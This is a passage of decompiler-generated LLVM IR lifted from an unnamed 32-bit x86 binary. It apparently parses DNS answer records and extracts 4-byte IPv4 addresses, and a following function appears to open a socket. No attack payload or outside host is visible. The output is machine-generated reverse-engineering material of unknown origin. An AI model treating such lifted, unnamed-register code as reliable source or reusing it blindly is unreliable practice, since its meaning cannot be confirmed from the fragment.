  %v4_804db66 = zext i8 %v3_804db66 to i32
  store i32 1, i32* @ebx, align 4
  %v2_804db74 = mul nuw nsw i32 %v1_804db61, 256
  %v2_804db77 = add nsw i32 %v2_804db74, -49152
  %v3_804db77 = or i32 %v4_804db66, %v2_804db77
  store i32 %v3_804db77, i32* %eax.global-to-local, align 4
  %v2_804db82 = add i32 %v1_804db7e, %v3_804db77
  store i32 %v2_804db82, i32* %edx.global-to-local, align 4
  %v1_804db84 = inttoptr i32 %v2_804db82 to i8*
  %v2_804db84 = load i8, i8* %v1_804db84, align 1
  %v3_804db84 = zext i8 %v2_804db84 to i32
  %v6_804db84 = or i32 %v3_804db84, %v2_804db77
  store i32 %v6_804db84, i32* %eax.global-to-local, align 4
  %v4_804db86 = icmp eq i8 %v2_804db84, 0
  %v1_804db88 = icmp eq i1 %v4_804db86, false
  br i1 %v1_804db88, label %dec_label_pc_804db59, label %dec_label_pc_804db8a

dec_label_pc_804db8a:                             ; preds = %dec_label_pc_804dc1c, %dec_label_pc_804db61, %dec_label_pc_804db4a
  %v4_804dba625 = phi i32 [ %v6_804db5318, %dec_label_pc_804db4a ], [ %v6_804db84, %dec_label_pc_804db61 ], [ %v6_804db53, %dec_label_pc_804dc1c ]
  %v5_804dc40 = phi i32 [ %v0_804db4a, %dec_label_pc_804db4a ], [ %v2_804db82, %dec_label_pc_804db61 ], [ %v1_804dc1c, %dec_label_pc_804dc1c ]
  %v1_804db8a = phi i32 [ 0, %dec_label_pc_804db4a ], [ 1, %dec_label_pc_804db61 ], [ %v0_804dc1d, %dec_label_pc_804dc1c ]
  %v0_804db8a = phi i32 [ 1, %dec_label_pc_804db4a ], [ %v0_804dc20, %dec_label_pc_804db61 ], [ %v3_804dc20, %dec_label_pc_804dc1c ]
  %v2_804db8a = add i32 %v1_804db8a, %v0_804db4a
  %v2_804db8c = add i32 %v2_804db8a, %v0_804db8a
  store i32 %v2_804db8c, i32* @esi, align 4
  %v1_804db8f = inttoptr i32 %v2_804db8c to i16*
  %v2_804db8f = load i16, i16* %v1_804db8f, align 2
  %v8_804db8f = icmp eq i16 %v2_804db8f, 256
  %v1_804db94 = add i32 %v2_804db8c, 10
  store i32 %v1_804db94, i32* @edi, align 4
  br i1 %v8_804db8f, label %dec_label_pc_804dc34, label %dec_label_pc_804db9d

dec_label_pc_804db9d:                             ; preds = %dec_label_pc_804dc34, %dec_label_pc_804db8a
  store i32 %v1_804db94, i32* %edx.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_804dba622 = inttoptr i32 %v1_804db94 to i8*
  %v2_804dba623 = load i8, i8* %v1_804dba622, align 1
  %v3_804dba624 = zext i8 %v2_804dba623 to i32
  %v5_804dba626 = and i32 %v4_804dba625, -256
  %v6_804dba627 = or i32 %v3_804dba624, %v5_804dba626
  store i32 %v6_804dba627, i32* %eax.global-to-local, align 4
  %v4_804dba828 = icmp eq i8 %v2_804dba623, 0
  br i1 %v4_804dba828, label %dec_label_pc_804dbd9, label %dec_label_pc_804dbac.preheader.preheader

dec_label_pc_804dbac.preheader.preheader:         ; preds = %dec_label_pc_804db9d
  %v1_804dbcd = add i32 %v0_804db42129, 32
  br label %dec_label_pc_804dbac.preheader

dec_label_pc_804dbac.preheader:                   ; preds = %dec_label_pc_804dbac.preheader.preheader, %dec_label_pc_804dc28
  %v0_804dc2c = phi i32 [ %v3_804dc2c, %dec_label_pc_804dc28 ], [ 1, %dec_label_pc_804dbac.preheader.preheader ]
  %v0_804dc2964 = phi i32 [ %v0_804dc29, %dec_label_pc_804dc28 ], [ 0, %dec_label_pc_804dbac.preheader.preheader ]
  %v0_804dbb560 = phi i32 [ %v1_804dc28, %dec_label_pc_804dc28 ], [ %v1_804db94, %dec_label_pc_804dbac.preheader.preheader ]
  %v0_804dbac58 = phi i32 [ %v6_804dba6, %dec_label_pc_804dc28 ], [ %v6_804dba627, %dec_label_pc_804dbac.preheader.preheader ]
  br label %dec_label_pc_804dbac

dec_label_pc_804dbac:                             ; preds = %dec_label_pc_804dbac.preheader, %dec_label_pc_804dbb0
  %v0_804dc29 = phi i32 [ %v0_804dc2964, %dec_label_pc_804dbac.preheader ], [ 1, %dec_label_pc_804dbb0 ]
  %v0_804dc28 = phi i32 [ %v0_804dbb560, %dec_label_pc_804dbac.preheader ], [ %v2_804dbd1, %dec_label_pc_804dbb0 ]
  %v4_804dba6 = phi i32 [ %v0_804dbac58, %dec_label_pc_804dbac.preheader ], [ %v6_804dbd3, %dec_label_pc_804dbb0 ]
  %v1_804dbac = trunc i32 %v4_804dba6 to i8
  %tmp142 = icmp ult i8 %v1_804dbac, -64
  br i1 %tmp142, label %dec_label_pc_804dc28, label %dec_label_pc_804dbb0

dec_label_pc_804dbb0:                             ; preds = %dec_label_pc_804dbac
  %v1_804dbb0 = urem i32 %v4_804dba6, 256
  store i32 %v1_804dbb0, i32* %eax.global-to-local, align 4
  %v1_804dbb5 = add i32 %v0_804dc28, 1
  %v2_804dbb5 = inttoptr i32 %v1_804dbb5 to i8*
  %v3_804dbb5 = load i8, i8* %v2_804dbb5, align 1
  %v4_804dbb5 = zext i8 %v3_804dbb5 to i32
  store i32 1, i32* %ecx.global-to-local, align 4
  %v2_804dbc3 = mul nuw nsw i32 %v1_804dbb0, 256
  %v2_804dbc6 = add nsw i32 %v2_804dbc3, -49152
  %v3_804dbc6 = or i32 %v4_804dbb5, %v2_804dbc6
  store i32 %v3_804dbc6, i32* %eax.global-to-local, align 4
  %v2_804dbd1 = add i32 %v1_804dbcd, %v3_804dbc6
  store i32 %v2_804dbd1, i32* %edx.global-to-local, align 4
  %v1_804dbd3 = inttoptr i32 %v2_804dbd1 to i8*
  %v2_804dbd3 = load i8, i8* %v1_804dbd3, align 1
  %v3_804dbd3 = zext i8 %v2_804dbd3 to i32
  %v6_804dbd3 = or i32 %v3_804dbd3, %v2_804dbc6
  store i32 %v6_804dbd3, i32* %eax.global-to-local, align 4
  %v4_804dbd5 = icmp eq i8 %v2_804dbd3, 0
  %v1_804dbd7 = icmp eq i1 %v4_804dbd5, false
  br i1 %v1_804dbd7, label %dec_label_pc_804dbac, label %dec_label_pc_804dbd9

dec_label_pc_804dbd9:                             ; preds = %dec_label_pc_804dc28, %dec_label_pc_804dbb0, %dec_label_pc_804db9d
  %v1_804dbd9 = phi i32 [ 0, %dec_label_pc_804db9d ], [ 1, %dec_label_pc_804dbb0 ], [ %v0_804dc29, %dec_label_pc_804dc28 ]
  %v0_804dbd9 = phi i32 [ 1, %dec_label_pc_804db9d ], [ %v0_804dc2c, %dec_label_pc_804dbb0 ], [ %v3_804dc2c, %dec_label_pc_804dc28 ]
  %v2_804dbd9 = add i32 %v0_804dbd9, %v1_804dbd9
  store i32 %v2_804dbd9, i32* @ebx, align 4
  %v2_804dbdb = add i32 %v2_804dbd9, %v1_804db94
  br label %dec_label_pc_804db3d.backedge

dec_label_pc_804db3d.backedge:                    ; preds = %dec_label_pc_804dbd9, %dec_label_pc_804dc50
  %v0_804db3d = phi i32 [ %v0_804db42129, %dec_label_pc_804dbd9 ], [ %v0_804db3d.pre, %dec_label_pc_804dc50 ]
  %storemerge = phi i32 [ %v2_804dbdb, %dec_label_pc_804dbd9 ], [ %v2_804dc5b, %dec_label_pc_804dc50 ]
  store i32 %storemerge, i32* %ecx.global-to-local, align 4
  %v1_804db3d = add i32 %v0_804db3d, 22
  %v2_804db3d = inttoptr i32 %v1_804db3d to i16*
  %v3_804db3d = load i16, i16* %v2_804db3d, align 2
  %v4_804db3d = add i16 %v3_804db3d, -1
  store i16 %v4_804db3d, i16* %v2_804db3d, align 2
  %v0_804db42 = load i32, i32* @esp, align 4
  %v1_804db42 = add i32 %v0_804db42, 22
  %v2_804db42 = inttoptr i32 %v1_804db42 to i16*
  %v3_804db42 = load i16, i16* %v2_804db42, align 2
  %v13_804db42 = icmp eq i16 %v3_804db42, -1
  br i1 %v13_804db42, label %dec_label_pc_804dad4, label %dec_label_pc_804db4a

dec_label_pc_804dbe3:                             ; preds = %dec_label_pc_804dad4
  %v1_804dbe3 = add i32 %v2_804dae0, 4
  %v2_804dbe3 = inttoptr i32 %v1_804dbe3 to i32*
  %v3_804dbe3 = load i32, i32* %v2_804dbe3, align 4
  store i32 %v3_804dbe3, i32* %eax.global-to-local, align 4
  %v1_804dbe6 = icmp eq i32 %v3_804dbe3, 0
  br i1 %v1_804dbe6, label %dec_label_pc_804dbf6, label %dec_label_pc_804dbea

dec_label_pc_804dbea:                             ; preds = %dec_label_pc_804dbe3
  %v3_804dbed = inttoptr i32 %v0_804dadd to i32*
  store i32 %v3_804dbe3, i32* %v3_804dbed, align 4
  %v1_804dbee = call i32 @function_8052c13(i32 1)
  store i32 %v1_804dbee, i32* %eax.global-to-local, align 4
  %v0_804dbf3 = load i32, i32* @esp, align 4
  %v1_804dbf3 = add i32 %v0_804dbf3, 16
  br label %dec_label_pc_804dbf6

dec_label_pc_804dbf6:                             ; preds = %dec_label_pc_804dbe3, %dec_label_pc_804dbea
  %v0_804dbf6 = phi i32 [ %v1_804dadd, %dec_label_pc_804dbe3 ], [ %v1_804dbf3, %dec_label_pc_804dbea ]
  %v2_804dbf9 = inttoptr i32 %v0_804dbf6 to i32*
  %v3_804dbf9 = load i32, i32* %v2_804dbf9, align 4
  store i32 %v3_804dbf9, i32* @esi, align 4
  %v2_804dbfd = add i32 %v0_804dbf6, -16
  %v3_804dbfd = inttoptr i32 %v2_804dbfd to i32*
  store i32 %v3_804dbf9, i32* %v3_804dbfd, align 4
  %v1_804dbfe = call i32 @function_8052c13(i32 1)
  store i32 %v1_804dbfe, i32* %eax.global-to-local, align 4
  %v0_804dc03 = load i32, i32* @esp, align 4
  %v1_804dc03 = add i32 %v0_804dc03, 16
  %v2_804dc03 = inttoptr i32 %v1_804dc03 to i32*
  store i32 0, i32* %v2_804dc03, align 4
  %v0_804dc0b = load i32, i32* @esp, align 4
  %v1_804dc0b = add i32 %v0_804dc0b, 16
  %v1_804dc0e = inttoptr i32 %v1_804dc0b to i32*
  %v2_804dc0e = load i32, i32* %v1_804dc0e, align 4
  store i32 %v2_804dc0e, i32* %eax.global-to-local, align 4
  %v1_804dc11 = add i32 %v0_804dc0b, 4300
  %v1_804dc17 = inttoptr i32 %v1_804dc11 to i32*
  %v2_804dc17 = load i32, i32* %v1_804dc17, align 4
  store i32 %v2_804dc17, i32* @ebx, align 4
  %v3_804dc18 = add i32 %v0_804dc0b, 4308
  %v1_804dc19 = inttoptr i32 %v3_804dc18 to i32*
  %v2_804dc19 = load i32, i32* %v1_804dc19, align 4
  store i32 %v2_804dc19, i32* @edi, align 4
  %v3_804dc19 = add i32 %v0_804dc0b, 4312
  %v1_804dc1a = inttoptr i32 %v3_804dc19 to i32*
  %v2_804dc1a = load i32, i32* %v1_804dc1a, align 4
  store i32 %v2_804dc1a, i32* @ebp, align 4
  ret i32 %v2_804dc0e

dec_label_pc_804dc1c:                             ; preds = %dec_label_pc_804db59
  %v1_804dc1c = add i32 %v0_804dc1c, 1
  store i32 %v1_804dc1c, i32* %edx.global-to-local, align 4
  %v5_804dc1d = icmp eq i32 %v0_804dc1d, 0
  %v2_804dc20 = zext i1 %v5_804dc1d to i32
  %v3_804dc20 = add i32 %v2_804dc20, %v0_804dc20
  %v1_804db53 = inttoptr i32 %v1_804dc1c to i8*
  %v2_804db53 = load i8, i8* %v1_804db53, align 1
  %v3_804db53 = zext i8 %v2_804db53 to i32
  %v5_804db53 = and i32 %v4_804db53, -256
  %v6_804db53 = or i32 %v3_804db53, %v5_804db53
  store i32 %v6_804db53, i32* %eax.global-to-local, align 4
  %v4_804db55 = icmp eq i8 %v2_804db53, 0
  br i1 %v4_804db55, label %dec_label_pc_804db8a, label %dec_label_pc_804db59.preheader

dec_label_pc_804dc28:                             ; preds = %dec_label_pc_804dbac
  %v1_804dc28 = add i32 %v0_804dc28, 1
  store i32 %v1_804dc28, i32* %edx.global-to-local, align 4
  %v5_804dc29 = icmp eq i32 %v0_804dc29, 0
  %v2_804dc2c = zext i1 %v5_804dc29 to i32
  %v3_804dc2c = add i32 %v2_804dc2c, %v0_804dc2c
  %v1_804dba6 = inttoptr i32 %v1_804dc28 to i8*
  %v2_804dba6 = load i8, i8* %v1_804dba6, align 1
  %v3_804dba6 = zext i8 %v2_804dba6 to i32
  %v5_804dba6 = and i32 %v4_804dba6, -256
  %v6_804dba6 = or i32 %v3_804dba6, %v5_804dba6
  store i32 %v6_804dba6, i32* %eax.global-to-local, align 4
  %v4_804dba8 = icmp eq i8 %v2_804dba6, 0
  br i1 %v4_804dba8, label %dec_label_pc_804dbd9, label %dec_label_pc_804dbac.preheader

dec_label_pc_804dc34:                             ; preds = %dec_label_pc_804db8a
  %v1_804dc34 = add i32 %v2_804db8c, 2
  %v2_804dc34 = inttoptr i32 %v1_804dc34 to i16*
  %v3_804dc34 = load i16, i16* %v2_804dc34, align 2
  %v9_804dc34 = icmp eq i16 %v3_804dc34, 256
  %v1_804dc3a = icmp eq i1 %v9_804dc34, false
  br i1 %v1_804dc3a, label %dec_label_pc_804db9d, label %dec_label_pc_804dc40

dec_label_pc_804dc40:                             ; preds = %dec_label_pc_804dc34
  %v1_804dc40 = add i32 %v2_804db8c, 8
  %v2_804dc40 = inttoptr i32 %v1_804dc40 to i16*
  %v3_804dc40 = load i16, i16* %v2_804dc40, align 2
  %v4_804dc40 = zext i16 %v3_804dc40 to i32
  %v6_804dc40 = and i32 %v5_804dc40, -65536
  %v7_804dc40 = or i32 %v4_804dc40, %v6_804dc40
  store i32 %v7_804dc40, i32* %edx.global-to-local, align 4
  %v2_804dc46 = call i16 @llvm.bswap.i16(i16 %v3_804dc40)
  %v3_804dc46 = zext i16 %v2_804dc46 to i32
  %v6_804dc46 = or i32 %v3_804dc46, %v6_804dc40
  store i32 %v6_804dc46, i32* %eax.global-to-local, align 4
  %v10_804dc4a = icmp eq i16 %v3_804dc40, 1024
  br i1 %v10_804dc4a, label %dec_label_pc_804dc63, label %dec_label_pc_804dc50

dec_label_pc_804dc50:                             ; preds = %dec_label_pc_804dc40, %dec_label_pc_804dc63
  %v0_804db3d.pre = phi i32 [ %v0_804db42129, %dec_label_pc_804dc40 ], [ %v0_804db3d.pre.pre, %dec_label_pc_804dc63 ]
  %v0_804dc5b = phi i32 [ %v1_804db94, %dec_label_pc_804dc40 ], [ %v0_804dc5b.pre, %dec_label_pc_804dc63 ]
  %v0_804dc50 = phi i32 [ %v7_804dc40, %dec_label_pc_804dc40 ], [ %v7_804dcc7, %dec_label_pc_804dc63 ]
  %v1_804dc50 = trunc i32 %v0_804dc50 to i16
  %v2_804dc50 = call i16 @llvm.bswap.i16(i16 %v1_804dc50)
  %v3_804dc50 = zext i16 %v2_804dc50 to i32
  %v5_804dc50 = and i32 %v0_804dc50, -65536
  %v6_804dc50 = or i32 %v3_804dc50, %v5_804dc50
  store i32 %v6_804dc50, i32* %edx.global-to-local, align 4
  store i32 %v3_804dc50, i32* %eax.global-to-local, align 4
  %v2_804dc5b = add i32 %v3_804dc50, %v0_804dc5b
  br label %dec_label_pc_804db3d.backedge

dec_label_pc_804dc63:                             ; preds = %dec_label_pc_804dc40
  %v2_804dc63 = inttoptr i32 %v1_804db94 to i8*
  %v3_804dc63 = load i8, i8* %v2_804dc63, align 1
  %v4_804dc63 = zext i8 %v3_804dc63 to i32
  %v6_804dc63 = and i32 %v6_804dc46, -256
  %v7_804dc63 = or i32 %v4_804dc63, %v6_804dc63
  store i32 %v7_804dc63, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v3_804dc68 = add i32 %v0_804db42129, 4280
  %v4_804dc68 = inttoptr i32 %v3_804dc68 to i8*
  store i8 %v3_804dc63, i8* %v4_804dc68, align 1
  %v0_804dc6f = load i32, i32* @edi, align 4
  %v1_804dc6f = add i32 %v0_804dc6f, 1
  %v2_804dc6f = inttoptr i32 %v1_804dc6f to i8*
  %v3_804dc6f = load i8, i8* %v2_804dc6f, align 1
  %v4_804dc6f = zext i8 %v3_804dc6f to i32
  %v5_804dc6f = load i32, i32* %eax.global-to-local, align 4
  %v6_804dc6f = and i32 %v5_804dc6f, -256
  %v7_804dc6f = or i32 %v6_804dc6f, %v4_804dc6f
  store i32 %v7_804dc6f, i32* %eax.global-to-local, align 4
  %v2_804dc72 = load i32, i32* @esp, align 4
  %v3_804dc72 = add i32 %v2_804dc72, 4281
  %v4_804dc72 = inttoptr i32 %v3_804dc72 to i8*
  store i8 %v3_804dc6f, i8* %v4_804dc72, align 1
  %v0_804dc79 = load i32, i32* @edi, align 4
  %v1_804dc79 = add i32 %v0_804dc79, 2
  %v2_804dc79 = inttoptr i32 %v1_804dc79 to i8*
  %v3_804dc79 = load i8, i8* %v2_804dc79, align 1
  %v4_804dc79 = zext i8 %v3_804dc79 to i32
  %v5_804dc79 = load i32, i32* %eax.global-to-local, align 4
  %v6_804dc79 = and i32 %v5_804dc79, -256
  %v7_804dc79 = or i32 %v6_804dc79, %v4_804dc79
  store i32 %v7_804dc79, i32* %eax.global-to-local, align 4
  %v2_804dc7c = load i32, i32* @esp, align 4
  %v3_804dc7c = add i32 %v2_804dc7c, 4282
  %v4_804dc7c = inttoptr i32 %v3_804dc7c to i8*
  store i8 %v3_804dc79, i8* %v4_804dc7c, align 1
  %v0_804dc83 = load i32, i32* @edi, align 4
  %v1_804dc83 = add i32 %v0_804dc83, 3
  %v2_804dc83 = inttoptr i32 %v1_804dc83 to i8*
  %v3_804dc83 = load i8, i8* %v2_804dc83, align 1
  %v4_804dc83 = zext i8 %v3_804dc83 to i32
  %v5_804dc83 = load i32, i32* %eax.global-to-local, align 4
  %v6_804dc83 = and i32 %v5_804dc83, -256
  %v7_804dc83 = or i32 %v6_804dc83, %v4_804dc83
  store i32 %v7_804dc83, i32* %eax.global-to-local, align 4
  %v2_804dc86 = load i32, i32* @esp, align 4
  %v3_804dc86 = add i32 %v2_804dc86, 4283
  %v4_804dc86 = inttoptr i32 %v3_804dc86 to i8*
  store i8 %v3_804dc83, i8* %v4_804dc86, align 1
  %v0_804dc8d = load i32, i32* %eax.global-to-local, align 4
  %v1_804dc8d = load i32, i32* @esp, align 4
  %v2_804dc8d = add i32 %v1_804dc8d, -4
  %v3_804dc8d = inttoptr i32 %v2_804dc8d to i32*
  store i32 %v0_804dc8d, i32* %v3_804dc8d, align 4
  %v0_804dc8e = load i32, i32* %eax.global-to-local, align 4
  %v2_804dc8e = add i32 %v1_804dc8d, -8
  %v3_804dc8e = inttoptr i32 %v2_804dc8e to i32*
  store i32 %v0_804dc8e, i32* %v3_804dc8e, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804dc91 = inttoptr i32 %v1_804dc8d to i32*
  %v3_804dc91 = load i32, i32* %v2_804dc91, align 4
  store i32 %v3_804dc91, i32* @edx, align 4
  %v1_804dc95 = inttoptr i32 %v3_804dc91 to i8*
  %v2_804dc95 = load i8, i8* %v1_804dc95, align 1
  %v3_804dc95 = zext i8 %v2_804dc95 to i32
  %v1_804dc97 = mul nuw nsw i32 %v3_804dc95, 4
  %v2_804dc97 = add nuw nsw i32 %v1_804dc97, 4
  store i32 %v2_804dc97, i32* %eax.global-to-local, align 4
  %v2_804dc9e = add i32 %v1_804dc8d, -12
  %v3_804dc9e = inttoptr i32 %v2_804dc9e to i32*
  store i32 %v2_804dc97, i32* %v3_804dc9e, align 4
  %v0_804dc9f = load i32, i32* @edx, align 4
  %v1_804dc9f = add i32 %v0_804dc9f, 4
  %v2_804dc9f = inttoptr i32 %v1_804dc9f to i32*
  %v3_804dc9f = load i32, i32* %v2_804dc9f, align 4
  store i32 %v3_804dc9f, i32* %eax.global-to-local, align 4
  %v2_804dca2 = add i32 %v1_804dc8d, -16
  %v3_804dca2 = inttoptr i32 %v2_804dca2 to i32*
  store i32 %v3_804dc9f, i32* %v3_804dca2, align 4
  %v0_804dca3 = call i32 @function_80526b6()
  store i32 %v0_804dca3, i32* %eax.global-to-local, align 4
  %v0_804dca8 = load i32, i32* @esp, align 4
  %v1_804dca8 = add i32 %v0_804dca8, 16
  %v2_804dca8 = inttoptr i32 %v1_804dca8 to i32*
  %v3_804dca8 = load i32, i32* %v2_804dca8, align 4
  store i32 %v3_804dca8, i32* %ecx.global-to-local, align 4
  %v1_804dcac = inttoptr i32 %v3_804dca8 to i8*
  %v2_804dcac = load i8, i8* %v1_804dcac, align 1
  %v3_804dcac = zext i8 %v2_804dcac to i32
  %v4_804dcac = load i32, i32* @edx, align 4
  %v5_804dcac = and i32 %v4_804dcac, -256
  %v6_804dcac = or i32 %v5_804dcac, %v3_804dcac
  store i32 %v6_804dcac, i32* %edx.global-to-local, align 4
  %v2_804dcae = add i32 %v3_804dca8, 4
  %v3_804dcae = inttoptr i32 %v2_804dcae to i32*
  store i32 %v0_804dca3, i32* %v3_804dcae, align 4
  %v0_804dcb1 = load i32, i32* %edx.global-to-local, align 4
  %v1_804dcb1 = urem i32 %v0_804dcb1, 256
  %v2_804dcb1 = load i32, i32* @ebx, align 4
  %v3_804dcb1 = and i32 %v2_804dcb1, -256
  %v4_804dcb1 = or i32 %v3_804dcb1, %v1_804dcb1
  store i32 %v4_804dcb1, i32* @ebx, align 4
  %v0_804dcb3 = load i32, i32* @esp, align 4
  %v1_804dcb3 = add i32 %v0_804dcb3, 4296
  %v2_804dcb3 = inttoptr i32 %v1_804dcb3 to i32*
  %v3_804dcb3 = load i32, i32* %v2_804dcb3, align 4
  store i32 %v3_804dcb3, i32* %ecx.global-to-local, align 4
  %v1_804dcba = add i32 %v0_804dcb1, 1
  store i32 %v1_804dcba, i32* %edx.global-to-local, align 4
  %v3_804dcbb = mul i32 %v4_804dcb1, 4
  %v4_804dcbb = add i32 %v3_804dcbb, %v0_804dca3
  %v5_804dcbb = inttoptr i32 %v4_804dcbb to i32*
  store i32 %v3_804dcb3, i32* %v5_804dcbb, align 4
  %v0_804dcbe = load i32, i32* @esp, align 4
  %v1_804dcbe = add i32 %v0_804dcbe, 16
  %v2_804dcbe = inttoptr i32 %v1_804dcbe to i32*
  %v3_804dcbe = load i32, i32* %v2_804dcbe, align 4
  store i32 %v3_804dcbe, i32* %eax.global-to-local, align 4
  %v0_804dcc5 = load i32, i32* %edx.global-to-local, align 4
  %v1_804dcc5 = trunc i32 %v0_804dcc5 to i8
  %v3_804dcc5 = inttoptr i32 %v3_804dcbe to i8*
  store i8 %v1_804dcc5, i8* %v3_804dcc5, align 1
  %v0_804dcc7 = load i32, i32* @esi, align 4
  %v1_804dcc7 = add i32 %v0_804dcc7, 8
  %v2_804dcc7 = inttoptr i32 %v1_804dcc7 to i16*
  %v3_804dcc7 = load i16, i16* %v2_804dcc7, align 2
  %v4_804dcc7 = zext i16 %v3_804dcc7 to i32
  %v5_804dcc7 = load i32, i32* %edx.global-to-local, align 4
  %v6_804dcc7 = and i32 %v5_804dcc7, -65536
  %v7_804dcc7 = or i32 %v6_804dcc7, %v4_804dcc7
  store i32 %v7_804dcc7, i32* %edx.global-to-local, align 4
  %v0_804dc5b.pre = load i32, i32* @edi, align 4
  %v0_804db3d.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804dc50

; uselistorder directives
  uselistorder i32 %v7_804dcc7, { 1, 0 }
  uselistorder i32 %v0_804dcb1, { 1, 0 }
  uselistorder i32 %v3_804dc50, { 0, 2, 1 }
  uselistorder i32 %v0_804dc50, { 1, 0 }
  uselistorder i32 %v6_804dba6, { 1, 0 }
  uselistorder i32 %v3_804dc2c, { 1, 0 }
  uselistorder i32 %v1_804dc28, { 1, 2, 0 }
  uselistorder i32 %v6_804db53, { 2, 1, 0 }
  uselistorder i32 %v3_804dc20, { 1, 0 }
  uselistorder i32 %v1_804dc1c, { 2, 3, 1, 0 }
  uselistorder i32 %v0_804dbf6, { 1, 0 }
  uselistorder i32 %v0_804db42, { 2, 1, 0 }
  uselistorder i32 %v6_804dbd3, { 1, 0 }
  uselistorder i32 %v2_804dbd1, { 1, 2, 0 }
  uselistorder i32 %v3_804dbc6, { 1, 0 }
  uselistorder i32 %v4_804dba6, { 1, 0, 2 }
  uselistorder i32 %v0_804dc29, { 2, 0, 1 }
  uselistorder i32 %v0_804dc2c, { 1, 0 }
  uselistorder i32 %v1_804db94, { 5, 4, 1, 0, 2, 3, 6 }
  uselistorder i32 %v6_804db84, { 0, 2, 1 }
  uselistorder i32 %v2_804db82, { 0, 2, 3, 1 }
  uselistorder i32 %v3_804db77, { 1, 0 }
  uselistorder i32 %v4_804db53, { 1, 0, 2 }
  uselistorder i32 %v0_804dc1d, { 2, 0, 1 }
  uselistorder i32 %v0_804dc20, { 1, 0 }
  uselistorder i32 %v6_804db5318, { 1, 0, 2 }
  uselistorder i32 %v0_804db4a, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_804db42129, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_804db42124, { 0, 2, 1 }
  uselistorder i32 %v1_804db13, { 1, 0 }
  uselistorder i32 %v0_804db0f, { 0, 1, 2, 4, 5, 3 }
  uselistorder i32 %v2_804db0a, { 1, 0, 2 }
  uselistorder i32 %v0_804dadd, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_804da9e, { 1, 0 }
  uselistorder i32 %v0_804da4f, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i32 %v0_804da4a, { 1, 0, 2 }
  uselistorder i32 %v1_804da17, { 1, 0 }
  uselistorder i32 %v2_804da14, { 1, 0 }
  uselistorder i32 %v0_804da10, { 1, 0 }
  uselistorder i32 %v1_804d9fd, { 2, 0, 1, 3 }
  uselistorder i32 %v12_804d9f1, { 1, 0 }
  uselistorder i32 %v0_804d9ee, { 2, 0, 1 }
  uselistorder i32 %v0_804d9d9, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_804d9b7, { 0, 6, 1, 2, 3, 4, 5 }
  uselistorder i32 %v0_804d998, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v4_804d993, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804d978, { 1, 0 }
  uselistorder i32 %v2_804d8ff, { 1, 0 }
  uselistorder i32 %v1_804d8f1, { 1, 0 }
  uselistorder i32 %v1_804d893, { 1, 0 }
  uselistorder i8 %v2_804d882, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804d87c, { 0, 2, 3, 1 }
  uselistorder i32 %v2_804d850, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 14, 2, 3, 13, 4, 5, 6, 7, 8, 10, 9, 11, 12 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 23, 27, 16, 17, 18, 19, 20, 21, 22, 60, 24, 25, 26, 58, 59, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i16 -1, { 2, 3, 0, 1 }
  uselistorder i32 4312, { 1, 0 }
  uselistorder i32 4308, { 1, 0 }
  uselistorder i32 4300, { 1, 0 }
  uselistorder label %dec_label_pc_804dc50, { 1, 0 }
  uselistorder label %dec_label_pc_804dbf6, { 1, 0 }
  uselistorder label %dec_label_pc_804db3d.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804dbac, { 1, 0 }
  uselistorder label %dec_label_pc_804dbac.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804db59, { 1, 0 }
  uselistorder label %dec_label_pc_804db59.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804db4a, { 1, 0 }
  uselistorder label %dec_label_pc_804dad4, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_804da9e, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_804d98c, { 1, 0 }
  uselistorder label %dec_label_pc_804d882, { 1, 0 }
}

define i32 @function_804dcd0() local_unnamed_addr {
dec_label_pc_804dcd0:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_804dcd0 = load i32, i32* @ebx, align 4
  %v0_804dcd1 = load i32, i32* @eax, align 4
  store i32 %v0_804dcd1, i32* @ebx, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_804dcf6 = add i32 %v0_804dcd1, 4
  %v2_804dcf6 = inttoptr i32 %v1_804dcf6 to i32*
  %v3_804dcf6 = load i32, i32* %v2_804dcf6, align 4
  %v10_804dcf9 = icmp eq i32 %v3_804dcf6, -1
  br i1 %v10_804dcf9, label %dec_label_pc_804dcd0.dec_label_pc_804dd0a_crit_edge, label %dec_label_pc_804dcfe

dec_label_pc_804dcd0.dec_label_pc_804dd0a_crit_edge: ; preds = %dec_label_pc_804dcd0
  br label %dec_label_pc_804dd0a

dec_label_pc_804dcfe:                             ; preds = %dec_label_pc_804dcd0
  %v1_804dd02 = call i32 @function_80514e3(i32 %v3_804dcf6)
  br label %dec_label_pc_804dd0a

dec_label_pc_804dd0a:                             ; preds = %dec_label_pc_804dcd0.dec_label_pc_804dd0a_crit_edge, %dec_label_pc_804dcfe
  %v0_804dd0a = phi i32 [ -1, %dec_label_pc_804dcd0.dec_label_pc_804dd0a_crit_edge ], [ %v1_804dd02, %dec_label_pc_804dcfe ]
  %v4_804dd11 = call i32 @function_8051cc7(i32 2, i32 1, i32 0, i32 %v0_804dd0a)
